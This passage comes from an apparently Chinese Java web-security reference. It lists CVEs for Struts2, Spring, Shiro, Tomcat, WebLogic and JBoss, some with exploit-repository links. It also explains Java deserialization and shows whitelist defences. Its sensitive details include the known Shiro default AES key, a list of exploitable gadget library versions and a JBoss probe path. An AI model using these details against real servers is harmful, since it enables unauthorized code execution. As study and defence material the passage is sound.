开始，主次版本号是否在处理范围内</li>\n<li>元数据验证</li>\n<li>字节码验证</li>\n<li>符号引用验证</li>\n</ul>\n<h1 id=\"部分运行选项与说明\"><a class=\"anchor\" href=\"#部分运行选项与说明\">#</a> 部分运行选项与说明</h1>\n<ul>\n<li><code>-Xverify:none</code>  关闭类加载时的验证措施</li>\n</ul>\n<h1 id=\"框架\"><a class=\"anchor\" href=\"#框架\">#</a> 框架</h1>\n<h2 id=\"servlet\"><a class=\"anchor\" href=\"#servlet\">#</a> Servlet</h2>\n<h3 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h3>\n<p>Servlet (Server Applet) 是 Java Servlet 的简称，称为小服务程序或服务连接器，是用 Java 编写的服务器端程序，主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。</p>\n<p>狭义的 Servlet 是指 Java 语言实现的一个接口，广义的 Servlet 是指任何实现了这个 Servlet 接口的类，一般情况下，人们将 Servlet 理解为后者。Servlet 运行于支持 Java 的应用服务器中。从原理上讲，Servlet 可以响应任何类型的请求，但绝大多数情况下 Servlet 只用来扩展基于 HTTP 协议的 Web 服务器。</p>\n<h3 id=\"生命周期为\"><a class=\"anchor\" href=\"#生命周期为\">#</a> 生命周期为</h3>\n<ul>\n<li>客户端请求该 Servlet</li>\n<li>加载 Servlet 类到内存</li>\n<li>实例化并调用 init () 方法初始化该 Servlet</li>\n<li>service ()(根据请求方法不同调用  <code>doGet()</code>  /  <code>doPost()</code>  / ... /  <code>destroy()</code></li>\n</ul>\n<h3 id=\"接口\"><a class=\"anchor\" href=\"#接口\">#</a> 接口</h3>\n<pre><code>init()\n</code></pre>\n<p>在 Servlet 的生命期中，仅执行一次 init () 方法，在服务器装入 Servlet 时执行。</p>\n<pre><code>service()\n</code></pre>\n<p>service () 方法是 Servlet 的核心。每当一个客户请求一个 HttpServlet 对象，该对象的  <code>service()</code>  方法就要被调用，而且传递给这个方法一个 &quot;请求&quot;(ServletRequest) 对象和一个 &quot;响应&quot;(ServletResponse) 对象作为参数。</p>\n<h2 id=\"struts-2\"><a class=\"anchor\" href=\"#struts-2\">#</a> Struts 2</h2>\n<h3 id=\"简介-3\"><a class=\"anchor\" href=\"#简介-3\">#</a> 简介</h3>\n<p>Struts2 是一个基于 MVC 设计模式的 Web 应用框架，它本质上相当于一个 servlet，在 MVC 设计模式中，Struts2 作为控制器 (Controller) 来建立模型与视图的数据交互。</p>\n<h3 id=\"请求流程\"><a class=\"anchor\" href=\"#请求流程\">#</a> 请求流程</h3>\n<ul>\n<li>客户端发送请求的 tomcat 服务器</li>\n<li>请求经过一系列过滤器</li>\n<li>FilterDispatcher 调用 ActionMapper 来决定这个请求是否要调用某个 Action</li>\n<li>ActionMppaer 决定调用某个 ActionFilterDispatcher 把请求给 ActionProxy</li>\n<li>ActionProxy 通过 Configuration Manager 查看 structs.xml，找到对应的 Action 类</li>\n<li>ActionProxy 创建一个 ActionInvocation 对象</li>\n<li>ActionInvocation 对象回调 Action 的 execute 方法</li>\n<li>Action 执行完毕后，ActionInvocation 根据返回的字符串，找到相应的 result，通过 HttpServletResponse 返回给服务器</li>\n</ul>\n<h3 id=\"相关cve\"><a class=\"anchor\" href=\"#相关cve\">#</a> 相关 CVE</h3>\n<ul>\n<li>CVE-2016-3081 (S2-032)</li>\n<li>CVE-2016-3687 (S2-033)</li>\n<li>CVE-2016-4438 (S2-037)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ltbXVuaW8vYXBhY2hlLXN0cnV0czItQ1ZFLTIwMTctNTYzOA==\">CVE-2017-5638</span></li>\n<li>CVE-2017-7672</li>\n<li>CVE-2017-9787</li>\n<li>CVE-2017-9793</li>\n<li>CVE-2017-9804</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hemVuMTYwL3N0cnV0cy1wd25fQ1ZFLTIwMTctOTgwNQ==\">CVE-2017-9805</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyaWFud3JmL1MyLTA1My1DVkUtMjAxNy0xMjYxMQ==\">CVE-2017-12611</span></li>\n<li>CVE-2017-15707</li>\n<li>CVE-2018-1327</li>\n<li>CVE-2018-11776</li>\n</ul>\n<h2 id=\"spring\"><a class=\"anchor\" href=\"#spring\">#</a> Spring</h2>\n<h3 id=\"简介-4\"><a class=\"anchor\" href=\"#简介-4\">#</a> 简介</h3>\n<p>Spring 一般指的是 Spring Framework，一个轻量级 Java 应用程序开源框架，提供了简易的开发方式。</p>\n<h3 id=\"spring-mvc\"><a class=\"anchor\" href=\"#spring-mvc\">#</a> Spring MVC</h3>\n<p>Spring MVC 根据 Spring 的模式设计的 MVC 框架，主要用于开发 Web 应用，简化开发。</p>\n<h3 id=\"spring-boot\"><a class=\"anchor\" href=\"#spring-boot\">#</a> Spring Boot</h3>\n<p>Spring 在推出之初方案较为繁琐，因此提供了 Spring Boot 作为自动化配置工具，降低项目搭建的复杂度。</p>\n<h3 id=\"请求流程-2\"><a class=\"anchor\" href=\"#请求流程-2\">#</a> 请求流程</h3>\n<ul>\n<li>用户发送请求给服务器</li>\n<li>服务器收到请求，使用 DispatchServlet 处理</li>\n<li>Dispatch 使用 HandleMapping 检查 url 是否有对应的 Controller，如果有，执行</li>\n<li>如果 Controller 返回字符串，ViewResolver 将字符串转换成相应的视图对象</li>\n<li>DispatchServlet 将视图对象中的数据，输出给服务器</li>\n<li>服务器将数据输出给客户端</li>\n</ul>\n<h3 id=\"cve概览\"><a class=\"anchor\" href=\"#cve概览\">#</a> CVE 概览</h3>\n<ul>\n<li>CVE-2018-1270\n<ul>\n<li>Spring Websocket 远程代码执行漏洞</li>\n<li>Spring Framework 5.0 - 5.0.5</li>\n<li>Spring Framework 4.3 - 4.3.15</li>\n</ul>\n</li>\n<li>CVE-2018-1273\n<ul>\n<li>Spring Data 远程代码执行漏洞</li>\n<li>Spring Data Commons 1.13 - 1.13.10</li>\n<li>Spring Data Commons 2.0 - 2.0.5</li>\n<li>Spring Data REST 2.6 - 2.6.10</li>\n<li>Spring Data REST 3.0 - 3.0.5</li>\n</ul>\n</li>\n<li>CVE-2017-8046\n<ul>\n<li>Spring Data REST 远程代码执行漏洞</li>\n</ul>\n</li>\n<li>CVE-2017-4971\n<ul>\n<li>Spring Web Flow 远程代码执行漏洞</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"shiro\"><a class=\"anchor\" href=\"#shiro\">#</a> Shiro</h2>\n<h3 id=\"简介-5\"><a class=\"anchor\" href=\"#简介-5\">#</a> 简介</h3>\n<p>Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，功能包括身份验证，授权，加密和会话管理。</p>\n<h3 id=\"cve概览-2\"><a class=\"anchor\" href=\"#cve概览-2\">#</a> CVE 概览</h3>\n<ul>\n<li>CVE-2020-13933\n<ul>\n<li>Apache Shiro &lt; 1.6.0</li>\n<li>身份验证绕过漏洞</li>\n</ul>\n</li>\n<li>CVE-2020-11989\n<ul>\n<li>SHIRO-782</li>\n<li>Apache Shiro &lt; 1.5.3</li>\n<li>身份验证绕过漏洞</li>\n</ul>\n</li>\n<li>CVE-2020-1957\n<ul>\n<li>SHIRO-682</li>\n<li>Apache Shiro &lt; 1.5.2</li>\n<li>身份验证绕过漏洞</li>\n</ul>\n</li>\n<li>CVE-2019-12422\n<ul>\n<li>SHIRO-721</li>\n<li>Apache Shiro &lt; 1.4.2</li>\n<li>Padding Oracle Attack 远程代码执行漏洞</li>\n</ul>\n</li>\n<li>CVE-2016-4437\n<ul>\n<li>SHIRO-550</li>\n<li>Apache Shiro &lt;= 1.2.4</li>\n<li>反序列化远程代码执行漏洞</li>\n</ul>\n</li>\n<li>CVE-2014-0074\n<ul>\n<li>SHIRO-460</li>\n<li>Apache Shiro &lt; 1.2.3</li>\n<li>身份验证绕过漏洞</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"cve-2020-13933\"><a class=\"anchor\" href=\"#cve-2020-13933\">#</a> CVE-2020-13933</h3>\n<p>Apache Shiro 1.6.0 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。</p>\n<h3 id=\"cve-2020-11989\"><a class=\"anchor\" href=\"#cve-2020-11989\">#</a> CVE-2020-11989</h3>\n<p>Apache Shiro 1.5.3 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。此漏洞存在两种攻击方式。</p>\n<h3 id=\"cve-2020-1957\"><a class=\"anchor\" href=\"#cve-2020-1957\">#</a> CVE-2020-1957</h3>\n<p>Apache Shiro 1.5.2 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。</p>\n<h3 id=\"cve-2019-12422\"><a class=\"anchor\" href=\"#cve-2019-12422\">#</a> CVE-2019-12422</h3>\n<p>Apache Shiro 1.4.2 之前的版本默认使用  <code>AES/CBC/PKCS5Padding</code>  模式加密，开启 RememberMe 功能的 Shiro 组件将允许远程攻击者构造序列化数据，通过 Padding Oracle Attack 进行爆破，即使在秘钥未知的条件下，也可以在目标服务器上执行任意命令。</p>\n<h3 id=\"cve-2016-4437\"><a class=\"anchor\" href=\"#cve-2016-4437\">#</a> CVE-2016-4437</h3>\n<p>Apache Shiro 1.2.5 之前的版本在  <code>org.apache.shiro.mgt.AbstractRememberMeManager</code>  中存在 AES 默认秘钥  <code>kPH+bIxk5D2deZiIxcaaaA==</code>  ，开启 RememberMe 功能的 Shiro 组件将允许远程攻击者构造序列化数据，在目标服务器上执行任意命令。</p>\n<h1 id=\"容器\"><a class=\"anchor\" href=\"#容器\">#</a> 容器</h1>\n<p>常见的 Java 服务器有 Tomcat、Weblogic、JBoss、GlassFish、Jetty、Resin、IBM Websphere 等，这里对部分框架做一个简单的说明。</p>\n<h2 id=\"tomcat\"><a class=\"anchor\" href=\"#tomcat\">#</a> Tomcat</h2>\n<p>Tomcat 是一个轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，用于开发和调试 JSP 程序。</p>\n<p>在收到请求后，Tomcat 的处理流程如下：</p>\n<ul>\n<li>客户端访问 Web 服务器，发送 HTTP 请求</li>\n<li>Web 服务器接收到请求后，传递给 Servlet 容器</li>\n<li>Servlet 容器加载 Servlet，产生 Servlet 实例后，向其传递表示请求和响应的对象</li>\n<li>Servlet 实例使用请求对象得到客户端的请求信息，然后进行相应的处理</li>\n<li>Servlet 实例将处理结果通过响应对象发送回客户端，容器负责确保响应正确送出，同时将控制返回给 Web 服务器</li>\n</ul>\n<p>Tomcat 服务器是由一系列可配置的组件构成的，其中核心组件是 Catalina Servlet 容器，它是所有其他 Tomcat 组件的顶层容器。</p>\n<h3 id=\"相关cve-2\"><a class=\"anchor\" href=\"#相关cve-2\">#</a> 相关 CVE</h3>\n<ul>\n<li>CVE-2020-1938\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yMjgxMDguaHRtbA==\">https://www.freebuf.com/vuls/228108.html</span></li>\n</ul>\n</li>\n<li>CVE-2019-0232\n<ul>\n<li>远程代码执行</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3B5bjNyZC9DVkUtMjAxOS0wMjMyLw==\">https://github.com/pyn3rd/CVE-2019-0232/</span></li>\n</ul>\n</li>\n<li>CVE-2017-12615\n<ul>\n<li>任意文件写入</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJMU5EZzRNVEl4TXc9PSZhbXA7bWlkPTIyNDc0ODM2NTkmYW1wO2lkeD0xJmFtcDtzbj1jMjNiM2EzYjNiNDNkNzA5OTliZGJlNjQ0ZTc5ZjdlNQ==\">https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5</span></li>\n</ul>\n</li>\n<li>CVE-2013-2067</li>\n<li>CVE-2012-4534</li>\n<li>CVE-2012-4431</li>\n<li>CVE-2012-3546</li>\n<li>CVE-2012-3544</li>\n<li>CVE-2012-2733</li>\n<li>CVE-2011-3375</li>\n<li>CVE-2011-3190</li>\n<li>CVE-2008-2938</li>\n</ul>\n<h2 id=\"weblogic\"><a class=\"anchor\" href=\"#weblogic\">#</a> Weblogic</h2>\n<h3 id=\"简介-6\"><a class=\"anchor\" href=\"#简介-6\">#</a> 简介</h3>\n<p>WebLogic 是美国 Oracle 公司出品的一个 Application Server，是一个基于 Java EE 架构的中间件，WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。其将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>\n<p>WebLogic 对业内多种标准的全面支持，包括 EJB、JSP、Servlet、JMS、JDBC 等。</p>\n<h3 id=\"相关cve-3\"><a class=\"anchor\" href=\"#相关cve-3\">#</a> 相关 CVE</h3>\n<ul>\n<li>CVE-2019-2725\n<ul>\n<li>wls-wsat 反序列化远程代码执行</li>\n</ul>\n</li>\n<li>CVE-2019-2658</li>\n<li>CVE-2019-2650</li>\n<li>CVE-2019-2649</li>\n<li>CVE-2019-2648</li>\n<li>CVE-2019-2647</li>\n<li>CVE-2019-2646</li>\n<li>CVE-2019-2645</li>\n<li>CVE-2019-2618\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vY3ZlLTIwMTktMjYxOC8=\">https://github.com/jas502n/cve-2019-2618/</span></li>\n</ul>\n</li>\n<li>CVE-2019-2615</li>\n<li>CVE-2019-2568</li>\n<li>CVE-2018-3252</li>\n<li>CVE-2018-3248</li>\n<li>CVE-2018-3245</li>\n<li>CVE-2018-3201</li>\n<li>CVE-2018-3197</li>\n<li>CVE-2018-3191\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZvaWRmeW9vL0NWRS0yMDE4LTMxOTE=\">https://github.com/voidfyoo/CVE-2018-3191</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0xpYnJhZ2dib25kL0NWRS0yMDE4LTMxOTE=\">https://github.com/Libraggbond/CVE-2018-3191</span></li>\n</ul>\n</li>\n<li>CVE-2018-2894\n<ul>\n<li>任意文件上传</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjQ1OA==\">https://xz.aliyun.com/t/2458</span></li>\n</ul>\n</li>\n<li>CVE-2018-2893\n<ul>\n<li>反序列化</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8xNzgxMDUuaHRtbA==\">https://www.freebuf.com/vuls/178105.html</span></li>\n</ul>\n</li>\n<li>CVE-2018-2628\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvbllZNHpnMm0yeHNxVDBHWGE5cE1HQQ==\">https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</span></li>\n</ul>\n</li>\n<li>CVE-2018-1258</li>\n<li>CVE-2017-10271\n<ul>\n<li>XMLDecoder 反序列化漏洞</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3dlYmNhY2hlLmdvb2dsZXVzZXJjb250ZW50LmNvbS9zZWFyY2g/cT1jYWNoZSUzQXNIN2o4VEY4dU9JSiUzQXd3dy5mcmVlYnVmLmNvbSUyRnZ1bHMlMkYxNjAzNjcuaHRtbA==\">http://webcache.googleusercontent.com/search?q=cache%3AsH7j8TF8uOIJ%3Awww.freebuf.com%2Fvuls%2F160367.html</span></li>\n</ul>\n</li>\n<li>CVE-2017-3248</li>\n<li>CVE-2016-3510</li>\n<li>CVE-2015-4852\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JvbzdicmVhay9zZXJpYWxhdG9y\">https://github.com/roo7break/serialator</span></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"jboss\"><a class=\"anchor\" href=\"#jboss\">#</a> JBoss</h2>\n<h3 id=\"简介-7\"><a class=\"anchor\" href=\"#简介-7\">#</a> 简介</h3>\n<p>JBoss 是一个基于 J2EE 的管理 EJB 的容器和服务器，但 JBoss 核心服务不包括支持 servlet/JSP 的 WEB 容器，一般与 Tomcat 或 Jetty 绑定使用。</p>\n<h3 id=\"相关cve-4\"><a class=\"anchor\" href=\"#相关cve-4\">#</a> 相关 CVE</h3>\n<ul>\n<li>CVE-2017-12149\n<ul>\n<li>反序列化漏洞</li>\n<li>访问  <code>/invoker/readonly</code>  ，页面存在即有反序列化漏洞</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"jetty\"><a class=\"anchor\" href=\"#jetty\">#</a> Jetty</h2>\n<h3 id=\"简介-8\"><a class=\"anchor\" href=\"#简介-8\">#</a> 简介</h3>\n<p>Jetty 是一个开源的 servlet 容器。</p>\n<h1 id=\"沙箱\"><a class=\"anchor\" href=\"#沙箱\">#</a> 沙箱</h1>\n<h2 id=\"简介-9\"><a class=\"anchor\" href=\"#简介-9\">#</a> 简介</h2>\n<p>Java 实现了一套沙箱环境，使远程的非可信代码只能在受限的环境下执行。</p>\n<h2 id=\"相关cve-5\"><a class=\"anchor\" href=\"#相关cve-5\">#</a> 相关 CVE</h2>\n<ul>\n<li>CVE-2012-0507</li>\n<li>CVE-2012-4681</li>\n<li>CVE-2017-3272</li>\n<li>CVE-2017-3289</li>\n</ul>\n<h1 id=\"反序列化\"><a class=\"anchor\" href=\"#反序列化\">#</a> 反序列化</h1>\n<h2 id=\"简介-10\"><a class=\"anchor\" href=\"#简介-10\">#</a> 简介</h2>\n<p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。一般用于远程调用、通过网络将对象传输至远程服务器、存储对象到数据库或本地等待重用等场景中。Java 中的  <code>ObjectOutputStream</code>  类的  <code>writeObject()</code>  方法可以实现序列化，类  <code>ObjectInputStream</code>  类的  <code>readObject()</code>  方法用于反序列化。如果要实现类的反序列化，则是对其实现  <code>Serializable</code>  接口。</p>\n<p>当远程服务接受不可信的数据并进行反序列化且当前环境中存在可利用的类时，就认为存在反序列化漏洞。</p>\n<h3 id=\"序列数据结构\"><a class=\"anchor\" href=\"#序列数据结构\">#</a> 序列数据结构</h3>\n<ul>\n<li><code>0xaced</code>  魔术头 / STREAM_MAGIC</li>\n<li><code>0x0005</code>  版本号 / STREAM_VERSION / 参考 java.io.ObjectStreamConstants</li>\n<li><code>0x73</code>  对象类型标识</li>\n<li><code>0x72</code>  类描述符标识</li>\n</ul>\n<h3 id=\"序列化流程\"><a class=\"anchor\" href=\"#序列化流程\">#</a> 序列化流程</h3>\n<ul>\n<li>ObjectOutputStream 实例初始化时，将魔术头和版本号写入 bout (BlockDataOutputStream 类型) 中</li>\n<li>调用 ObjectOutputStream.writeObject () 开始写对象数据\n<ul>\n<li>ObjectStreamClass.lookup () 封装待序列化的类描述 (返回 ObjectStreamClass 类型) ，获取包括类名、自定义 serialVersionUID、可序列化字段 (返回 ObjectStreamField 类型) 和构造方法，以及 writeObject、readObject 方法等</li>\n<li>writeOrdinaryObject () 写入对象数据\n<ul>\n<li>写入对象类型标识</li>\n<li>writeClassDesc () 进入分支  writeNonProxyDesc () 写入类描述数据\n<ul>\n<li>写入类描述符标识</li>\n<li>写入类名</li>\n<li>写入 SUID (当 SUID 为空时，会进行计算并赋值)</li>\n<li>计算并写入序列化属性标志位</li>\n<li>写入字段信息数据</li>\n<li>写入 Block Data 结束标识</li>\n<li>写入父类描述数据</li>\n</ul>\n</li>\n<li>writeSerialData () 写入对象的序列化数据\n<ul>\n<li>若类自定义了 writeObject ()，则调用该方法写对象，否则调用 defaultWriteFields () 写入对象的字段数据 (若是非原始类型，则递归处理子对象)</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"53713-反序列化流程\"><a class=\"anchor\" href=\"#53713-反序列化流程\">#</a> 5.3.7.1.3. 反序列化流程</h3>\n<ul>\n<li>\n<p>ObjectInputStream 实例初始化时，读取魔术头和版本号进行校验</p>\n</li>\n<li>\n<p>调用 ObjectInputStream.readObject () 开始读对象数据</p>\n<ul>\n<li>读取对象类型标识</li>\n<li>readOrdinaryObject () 读取数据对象\n<ul>\n<li>readClassDesc () 读取类描述数据\n<ul>\n<li>读取类描述符标识，进入分支 readNonProxyDesc ()</li>\n<li>读取类名</li>\n<li>读取 SUID</li>\n<li>读取并分解序列化属性标志位</li>\n<li>读取字段信息数据</li>\n<li>resolveClass () 根据类名获取待反序列化的类的 Class 对象，如果获取失败，则抛出 ClassNotFoundException</li>\n<li>skipCustomData () 循环读取字节直到 Block Data 结束标识为止</li>\n<li>读取父类描述数据</li>\n<li>initNonProxy () 中判断对象与本地对象的 SUID 和类名 (不含包名) 是否相同，若不同，则抛出 InvalidClassException</li>\n</ul>\n</li>\n<li>ObjectStreamClass.newInstance () 获取并调用离对象最近的非 Serializable 的父类的无参构造方法 (若不存在，则返回 null) 创建对象实例</li>\n<li>readSerialData () 读取对象的序列化数据\n<ul>\n<li>若类自定义了 readObject ()，则调用该方法读对象，否则调用 defaultReadFields () 读取并填充对象的字段数据</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"5372-漏洞利用\"><a class=\"anchor\" href=\"#5372-漏洞利用\">#</a> 5.3.7.2. 漏洞利用</h2>\n<h3 id=\"53721-存在危险的基础库\"><a class=\"anchor\" href=\"#53721-存在危险的基础库\">#</a> 5.3.7.2.1. 存在危险的基础库</h3>\n<ul>\n<li><code>com.mchange:c3p0 0.9.5.2</code></li>\n<li><code>com.mchange:mchange-commons-java 0.2.11</code></li>\n<li><code>commons-beanutils 1.9.2</code></li>\n<li><code>commons-collections 3.1</code></li>\n<li><code>commons-fileupload 1.3.1</code></li>\n<li><code>commons-io 2.4</code></li>\n<li><code>commons-logging 1.2</code></li>\n<li><code>org.apache.commons:commons-collections 4.0</code></li>\n<li><code>org.beanshell:bsh 2.0b5</code></li>\n<li><code>org.codehaus.groovy:groovy 2.3.9</code></li>\n<li><code>org.slf4j:slf4j-api 1.7.21</code></li>\n<li><code>org.springframework:spring-aop 4.1.4.RELEASE</code></li>\n</ul>\n<h3 id=\"53722-回显方式\"><a class=\"anchor\" href=\"#53722-回显方式\">#</a> 5.3.7.2.2. 回显方式</h3>\n<ul>\n<li>通过中间件特性回显</li>\n<li>通过抛出异常回显</li>\n<li>通过 OOB 回显</li>\n<li>通过写静态文件回显</li>\n</ul>\n<h2 id=\"5373-漏洞修复和防护\"><a class=\"anchor\" href=\"#5373-漏洞修复和防护\">#</a> 5.3.7.3. 漏洞修复和防护</h2>\n<h3 id=\"53731-hook-resolveclass\"><a class=\"anchor\" href=\"#53731-hook-resolveclass\">#</a> 5.3.7.3.1. Hook resolveClass</h3>\n<p>在使用  <code>readObject()</code>  反序列化时会调用  <code>resolveClass</code>  方法读取反序列化的类名，可以通过 hook 该方法来校验反序列化的类，一个 Demo 如下</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">protected</span> <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">resolveClass</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ObjectStreamClass</span> desc<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>desc<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">SerialObject</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvalidClassException</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token string\">\"Unauthorized deserialization attempt\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                desc<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">resolveClass</span><span class=\"token punctuation\">(</span>desc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>以上的 Demo 就只允许序列化  <code>SerialObject</code>  ，通过这种方式，就可以设置允许序列化的白名单，来防止反序列化漏洞被利用。SerialKiller/Jackson/Weblogic 等都使用了这种方式来防御。</p>\n<h3 id=\"53732-validatingobjectinputstream\"><a class=\"anchor\" href=\"#53732-validatingobjectinputstream\">#</a> 5.3.7.3.2. ValidatingObjectInputStream</h3>\n<p>Apache Commons IO Serialization 包中的  <code>ValidatingObjectInputStream</code>  类提供了  <code>accept</code>  方法，可以通过该方法来实现反序列化类白 / 黑名单控制，一个 demo 如下</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">deserialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> buffer<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">,</span> <span class=\"token class-name\">ConfigurationException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">ByteArrayInputStream</span> bais <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ByteArrayInputStream</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">ValidatingObjectInputStream</span> ois <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ValidatingObjectInputStream</span><span class=\"token punctuation\">(</span>bais<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    ois<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">SerialObject</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    obj <span class=\"token operator\">=</span> ois<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> obj<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"53733-objectinputfilterjep290\"><a class=\"anchor\" href=\"#53733-objectinputfilterjep290\">#</a> 5.3.7.3.3. ObjectInputFilter(JEP290)</h3>\n<p>Java 9 提供了支持序列化数据过滤的新特性，可以继承  <code>java.io.ObjectInputFilter</code>  类重写  <code>checkInput</code>  方法来实现自定义的过滤器，并使用  <code>ObjectInputStream</code>  对象的  <code>setObjectInputFilter</code>  设置过滤器来实现反序列化类白 / 黑名单控制。这个机制本身是针对 Java 9 的一个新特性，但是随后官方突然决定向下引进该增强机制，分别对 JDK 6,7,8 